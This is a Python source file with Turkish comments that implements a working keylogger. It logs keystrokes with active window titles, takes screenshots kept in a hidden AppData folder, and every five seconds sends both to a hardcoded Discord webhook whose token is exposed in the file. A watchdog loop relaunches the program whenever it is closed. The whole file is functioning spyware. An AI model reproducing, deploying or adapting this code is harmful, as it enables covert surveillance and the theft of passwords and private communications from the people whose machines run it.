import time
import datetime
import pyautogui
import pygetwindow as gw
from pynput import keyboard
from discord_webhook import DiscordWebhook, DiscordEmbed
from threading import Thread
import os
import subprocess
import sys

webhook_url = "https://discord.com/api/webhooks/1395101149711044618/TyGPeeM2V5RqQVNwonG8qNZbiNXffakFGHd-zZsafrUV2JMWSSTaF4jPFMQDmjYmxC8v"

keys_pressed = []
last_window = ""

def get_active_window_title():
    try:
        return gw.getActiveWindow().title
    except:
        return "Bilinmeyen Pencere"

def on_press(key):
    global last_window
    try:
        active_window = get_active_window_title()
        if active_window != last_window:
            keys_pressed.append(f"\n\n>>> [{active_window}] >>>\n")
            last_window = active_window

        ignore_keys = {
            keyboard.Key.backspace, keyboard.Key.delete,
            keyboard.Key.tab, keyboard.Key.shift, keyboard.Key.shift_r, keyboard.Key.ctrl,
            keyboard.Key.ctrl_l, keyboard.Key.ctrl_r, keyboard.Key.alt, keyboard.Key.alt_gr,
            keyboard.Key.cmd, keyboard.Key.cmd_r, keyboard.Key.esc, keyboard.Key.insert,
            keyboard.Key.home, keyboard.Key.end, keyboard.Key.page_up,
            keyboard.Key.page_down, keyboard.Key.caps_lock,
            keyboard.Key.f1, keyboard.Key.f2, keyboard.Key.f3, keyboard.Key.f4,
            keyboard.Key.f5, keyboard.Key.f6, keyboard.Key.f7, keyboard.Key.f8,
            keyboard.Key.f9, keyboard.Key.f10, keyboard.Key.f11, keyboard.Key.f12,
            keyboard.Key.print_screen, keyboard.Key.num_lock, keyboard.Key.scroll_lock
        }

        if key in ignore_keys:
            return

        if key == keyboard.Key.space:
            keys_pressed.append(" ")
        elif key == keyboard.Key.enter:
            keys_pressed.append("[ENTER]\n")
        else:
            char = str(key).replace("'", "")
            if len(char) == 1:
                keys_pressed.append(char.upper())
            elif char.startswith("Key."):
                pass
            else:
                keys_pressed.append(char.upper())

    except Exception as e:
        print(f"Hata: {e}")

def capture_screenshot():
    hidden_folder = os.path.join(os.getenv("APPDATA"), ".sysdata")
    os.makedirs(hidden_folder, exist_ok=True)  # Gizli klasörü oluştur

    screenshot_path = os.path.join(hidden_folder, "snap.png")
    screenshot = pyautogui.screenshot()
    screenshot.save(screenshot_path)

    # Windows'ta dosyayı gizli yap
    try:
        subprocess.call(['attrib', '+H', screenshot_path])
    except Exception as e:
        print(f"Gizli dosya yapma hatası: {e}")

    return screenshot_path

def send_to_discord():
    global keys_pressed

    if keys_pressed:
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        message = f"Tarih: {timestamp}\nTuşlar:\n{''.join(keys_pressed)}"

        webhook = DiscordWebhook(url=webhook_url)
        embed = DiscordEmbed(title="Keylogger Raporu", description=message, color='03b2f8')
        webhook.add_embed(embed)

        screenshot_path = capture_screenshot()
        with open(screenshot_path, "rb") as f:
            webhook.add_file(file=f.read(), filename="screenshot.png")

        response = webhook.execute()

        if response.status_code == 204:
            print("Gönderildi")
        else:
            print("Hata:", response.status_code)

        # Dosyayı sil
        if os.path.exists(screenshot_path):
            os.remove(screenshot_path)

        keys_pressed = []

def start_keylogger():
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

def watchdog():
    """
    Program kapanırsa kendini yeniden başlatır.
    """
    while True:
        # Ana script dosyasının yolu
        script_path = os.path.abspath(sys.argv[0])

        # Yeni process başlat
        proc = subprocess.Popen([sys.executable, script_path, "run"])

        # Process kapanana kadar bekle
        proc.wait()

        # 1 saniye bekle ve tekrar başlat
        time.sleep(1)

if __name__ == "__main__":
    # Eğer argüman "run" ise, ana keylogger'u başlat
    if len(sys.argv) > 1 and sys.argv[1] == "run":
        keylogger_thread = Thread(target=start_keylogger)
        keylogger_thread.daemon = True
        keylogger_thread.start()

        try:
            while True:
                send_to_discord()
                time.sleep(5)
        except KeyboardInterrupt:
            pass

    else:
        # Watchdog modu: program kapanınca kendini yeniden başlatır
        watchdog()
